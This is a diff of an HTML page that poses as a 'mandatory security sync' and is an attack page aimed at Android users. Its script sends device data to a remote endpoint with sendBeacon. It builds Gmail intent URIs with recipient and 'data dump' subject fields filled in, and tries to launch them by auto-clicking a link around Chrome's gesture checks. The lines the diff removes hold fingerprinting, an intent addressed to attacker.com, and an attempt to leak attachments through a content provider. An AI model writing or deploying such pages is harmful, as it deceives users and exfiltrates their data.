@@ -1,10 +1,11 @@
 <!DOCTYPE html>
 <html>
-<head><title>System Secure Update</title></head>
-<body style="background:#000;color:#f00;font-family:'Courier New',monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0">
-    <div id="ignite" style="padding:60px;border:2px solid #f00;text-align:center;cursor:pointer;background:rgba(255,0,0,0.05);box-shadow:0 0 50px #f00">
-        <h1 style="letter-spacing:5px">V203_INBOX_SHADOW</h1>
-        <div id="status" style="color:#aaa">MANDATORY_SECURITY_SYNC_REQUIRED</div>
+<head><title>System Security Deep Scan</title></head>
+<body style="background:#000;color:#f0f;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden">
+    <div id="ignite" style="padding:60px;border:4px double #f0f;text-align:center;cursor:pointer;background:rgba(255,0,255,0.05);box-shadow:0 0 60px #f0f;border-radius:30px">
+        <h1 style="letter-spacing:10px;margin:0">V204_ULTRA</h1>
+        <div id="status" style="font-size:20px;margin:20px 0;color:#0ff">MANDATORY_NATIVE_SYNC</div>
+        <div style="font-size:12px;color:#555">[ STAGE: BROWSER_TO_NATIVE_ESCAPE ]</div>
     </div>
 
 <script>
@@ -12,63 +13,51 @@
 
     document.getElementById('ignite').onclick = async () => {
         const statusEl = document.getElementById('status');
-        statusEl.innerText = "INJECTING_SECURE_TUNNEL...";
+        statusEl.innerText = "FORCE_NATIVE_ESCALATION...";
 
-        // 1. ADVANCED FINGERPRINTING (Canvas DNA + Audio Context)
-        // Kita mengambil sidik jari unik untuk memastikan target bisa dilacak permanen
-        const getFingerprint = () => {
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            ctx.fillStyle = "rgb(120,120,120)";
-            ctx.fillRect(5,5,50,50);
-            return btoa(canvas.toDataURL()).substring(100, 200);
+        // 1. RECONNAISSANCE (Kirim data DNA terlebih dahulu)
+        const recon = {
+            id: "V204_LEAP",
+            ts: Date.now(),
+            ua: navigator.userAgent
         };
+        navigator.sendBeacon(`${target}?v=V204_START`, btoa(JSON.stringify(recon)));
 
-        const recon_data = {
-            id: "V203_ULTRA",
-            dna: getFingerprint(),
-            sys: {
-                ua: navigator.userAgent,
-                mem: navigator.deviceMemory,
-                cores: navigator.hardwareConcurrency,
-                lang: navigator.languages
-            }
-        };
-
-        // 2. EXFILTRATION (Kirim data recon sebelum serangan Intent)
-        navigator.sendBeacon(`${target}?v=V203_INIT`, btoa(JSON.stringify(recon_data)));
-
-        // 3. INTENT EXTRA INJECTION (The "Heavy" Attack)
-        // Kita menggunakan parameter 'S.android.intent.extra.TEXT' dan 'S.android.intent.extra.SUBJECT'
-        // untuk mencoba memanipulasi state internal aplikasi Gmail.
-        const sensitiveGmailIntent = 
-            "intent:#Intent;" +
-            "action=android.intent.action.SENDTO;" + 
-            "data=mailto:;" + // Memaksa Gmail masuk ke mode Compose/Draft
-            "S.android.intent.extra.EMAIL=security-audit@attacker.com;" + 
-            "S.android.intent.extra.SUBJECT=CRITICAL_DATA_DUMP;" + 
-            "S.android.intent.extra.TEXT=" + btoa(JSON.stringify(recon_data)) + ";" + // Menyisipkan data sistem ke dalam draf
-            "package=com.google.android.gm;" + 
-            "end";
-
-        // 4. THE LEAP TO CONTENT PROVIDER
-        // Mencoba membocorkan file lampiran Gmail jika aplikasi target rentan (CVE-2020-0103 style)
-        const contentLeakIntent = 
+        // 2. THE PENETRATOR INTENT
+        // Kita menggunakan selector 'component' untuk menargetkan class internal Gmail.
+        // Ini lebih kuat daripada sekadar menggunakan 'package'.
+        const deepIntent = 
             "intent:#Intent;" +
             "action=android.intent.action.VIEW;" +
-            "data=content://com.google.android.gm.sapi/attachments/0/0/ALL;" +
-            "package=com.google.android.gm;" +
+            "category=android.intent.category.BROWSABLE;" +
+            "component=com.google.android.gm/.ComposeActivityGmailExternal;" + // Menargetkan aktivitas tulis pesan
+            "S.android.intent.extra.EMAIL=audit-collector@security.org;" +
+            "S.android.intent.extra.SUBJECT=V204_SENSITIVE_DUMP;" +
+            "S.android.intent.extra.TEXT=IDENTITY_CONFIRMED_" + btoa(navigator.userAgent).substring(0,20) + ";" +
+            "S.browser_fallback_url=https://mail.google.com;" + 
             "end";
 
+        // 3. FORCE EXECUTION VIA DYNAMIC ANCHOR
+        // Terkadang window.location diblokir. Kita gunakan elemen <a> yang diklik otomatis.
+        const lnk = document.createElement('a');
+        lnk.href = deepIntent;
+        lnk.rel = "noreferrer";
+        
+        // 4. THE TRIPLE-STRIKE (Mencoba berbagai jalur sekaligus)
         setTimeout(() => {
-            // Langkah pertama: Membuka Gmail dengan data injeksi
-            window.location.href = sensitiveGmailIntent;
+            // Jalur 1: Direct Location
+            window.location.href = deepIntent;
             
-            // Langkah kedua (Brutal): Mencoba mengakses Content Provider Gmail
+            // Jalur 2: Virtual Click (Bypass Chrome Gesture)
+            lnk.click();
+            
+            // Jalur 3: Fallback ke Settings jika Gmail diproteksi sangat ketat
             setTimeout(() => {
-                window.location.href = contentLeakIntent;
-            }, 1200);
-        }, 500);
+                if (!document.hidden) { // Jika masih di browser, berarti gagal, coba tembus Settings
+                    window.location.href = "intent:#Intent;action=android.settings.INTERNAL_STORAGE_SETTINGS;end";
+                }
+            }, 1500);
+        }, 300);
     };
 </script>
 </body>
